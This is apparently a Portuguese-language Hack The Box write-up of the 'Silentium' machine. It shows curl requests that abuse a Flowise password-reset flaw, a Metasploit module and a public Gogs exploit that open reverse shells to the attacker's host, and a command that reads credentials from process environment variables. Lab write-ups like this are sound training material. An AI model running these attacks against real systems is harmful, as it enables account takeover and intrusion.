# CTF Silentium | Hack The Box

Máquina: Silentium  
Dificuldade: Fácil  
Plataforma: Hack The Box


![](https://miro.medium.com/v2/resize:fit:700/1*WH3oCgwPtcFwvZSKqVlQTw.jpeg)

# Reconhecimento

Iniciamos com uma enumeração do host, utilizando o Nmap afim de identificar serviços expostos e portas ativas.

```
nmap -p- --min-rate 1600 -sVC -Pn --open 10.129.29.33
```

Obtendo as portas:

![](https://miro.medium.com/v2/resize:fit:669/1*YyHtU_sIeZfzay5AiFwIQA.png)

Ao identificarmos o domínio **`silentium.htb`** o adicionamos ao arquivo `**/etc/hosts**`. Posteriormente navegamos para o domínio na porta `**80 (HTTP)**`, onde nos deparamos com uma aplicação web de finanças.


![](https://miro.medium.com/v2/resize:fit:700/1*7xSB-plhlsjy2V7UXmG4Nw.png)

Analisando a aplicação web encontramos possíveis usuários.


![](https://miro.medium.com/v2/resize:fit:700/1*8AJKvUEuxdAQDg3vvRmofg.png)

Em seguida, decidimos por realizarmos um **fuzzing** de subdomínios utilizando a ferramenta **Gobuster**, para descobrirmos subdomínios ocultos.

```
gobuster vhost -u http://silentium.htb:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain -xs 400,404
```

Obtendo o subdomínio:

![](https://miro.medium.com/v2/resize:fit:700/1*86kJLQQe6FrKdmg9c6EM1A.png)

Encontramos o subdomínio **`staging.silentium.htb`** onde adicionamos ao arquivo `**/etc/hosts**` . Acessando o subdomínio, identificamos uma instância do Flowise AI.

![](https://miro.medium.com/v2/resize:fit:700/1*3Jb55ucrCNFfoEfgObOiUg.png)

Ao clicarmos no botão `**Forgot password**` fomos redirecionados para o endpoint “Forgot password”.

![](https://miro.medium.com/v2/resize:fit:700/1*w6lfP-aYlhVfnAQ-H08RLg.png)

Analisando o endpoint descobrirmos que era vulnerável (**CVE-2025–58434**)

```
https://nvd.nist.gov/vuln/detail/CVE-2025-58434
```

Em seguida, utilizamos o e-mail do usuário `ben@silentium.htb` para simular a redefinição de senha em que a `**API**` retornava o token de redefinição diretamente no corpo da resposta, permitindo que fosse alterada a senha do usuário.

```
curl -s -X POST http://staging.silentium.htb/api/v1/accoun  
t/forgot-password \-H "Content-Type: application/json" \-d '{"user": {"email": "ben@silentium.htb"}}' | jq
```

![](https://miro.medium.com/v2/resize:fit:700/1*KGT3zaftHUyho_IYY3C8Yg.png)

Redefinindo a senha, utilizando a estrutura do retorno da API com o `**TempToken**`

```
 curl -X POST http://staging.silentium.htb/api/v1/account/re set-password \-H "Content-Type: application/json" \-d '{ "user": { "email": "ben@silentium.htb", "tempToken": "ttTFZlWObWKefEi2JHFPTJOGoQMucWiv0IA6DkV7N G4JDsLgZZ0EtRvPGDTLeia0", "password": "Password123!" } }'

```

![](https://miro.medium.com/v2/resize:fit:700/1*cPcNIoS7BCwQgmr0tbRRkw.png)

Conseguimos acesso ao `**Flowise AI**`

![](https://miro.medium.com/v2/resize:fit:700/1*In8w_AxUmyIeP9WxSlduGw.png)

# Exploração - Obtendo a user flag

Ao analisarmos o Dashboard do Flowise, descobrimos a vulnerabilidade (**CVE-2025–59528**).

```
hptts://nvd.nist.gov/vuln/detail/CVE-2025-59528
```

Utilizando o metasploit conseguimos obter a reverse shell através desse exploit de **js injection**:

```
exploit/multi/http/flowise_js_rce
```


![](https://miro.medium.com/v2/resize:fit:700/1*bWLM4DyMc9HUudW65vLHbw.png)

Ao rodarmos o exploit obtemos root dentro de um contêiner Docker

![](https://miro.medium.com/v2/resize:fit:700/1*S1p-VZ5o5v4WvgBpDwwqhg.png)

Em seguida, realizamos movimentação lateral ainda dentro do contêiner, em que coletamos variáveis de ambiente.

```
cat /proc/1/environ | tr '\0' '\n'
```

Encontramos a senha para posteriormente nos conectarmos via **SSH** diretamente ao usuário **ben**.

```
 SMTP_PASSWORD=r04D!!_R4ge
```


![](https://miro.medium.com/v2/resize:fit:700/1*krsshFdxTbdCk5qtl1u0-A.png)

Com o acesso ao **SSH** realizado com sucesso, obtemos a **user flag** no diretório do usuário.

![](https://miro.medium.com/v2/resize:fit:700/1*rNWkCJAJZH6_kKKoCk4_yA.png)

# Exploração — Obtendo a root flag

Em seguida, realizamos uma leitura de serviços internos utilizando o `**netsat**` em que identificamos um serviço rodando na porta `**3001**`

```
netstat -tulpn | grep 127.0.0.1
```

Então optamos por fazer um tunelamento via **SSH**

```
ssh -L 3001:127.0.0.1:3001 ben@10.129.245.103
```

Em seguida, descobrirmos que havia um serviço Silentium **`Gogs`** rodando nessa porta.


![](https://miro.medium.com/v2/resize:fit:700/1*SR2KEYc3GaPKgXO_8am0pA.png)

Para obtermos acesso a aplicação web, criamos uma conta através do `**register**`


![](https://miro.medium.com/v2/resize:fit:700/1*Kt4SZMUGWUPk1UwSZGU7ZQ.png)

Agora que temos acesso ao `**Dashboard**`


![](https://miro.medium.com/v2/resize:fit:700/1*n_itp4U9twxW5tQ7V0Cn2w.png)

Ao identificarmos a vulnerabilidade (**CVE-2025–8110**)

```
https://nvd.nist.gov/vuln/detail/CVE-2025-8110
```

Em seguida, geramos um token de API .

![](https://miro.medium.com/v2/resize:fit:700/1*TsF-xPULBF8C3XY-q8ATQQ.png)

Para explorar essa vulnerabilidade utilizamos o exploit

```
https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit
```

E logo utilizamos o comando:

```
python3 CVE-2025-8110.py -u http://localhost:3001 -un test -pw 123456 -t 60cf4599189ff0c9c59eed95c8668c151289aff8 -lh 10.10.14.23 -lp 6969
```

Conseguimos conexão com `**reverse shell**` :

![](https://miro.medium.com/v2/resize:fit:700/1*Fi20NnQbzXhjL47LJATOTw.png)

Obtendo a flag:

![](https://miro.medium.com/v2/resize:fit:700/1*5bpxZ6YP2yFMXs3GTQF2qA.png)
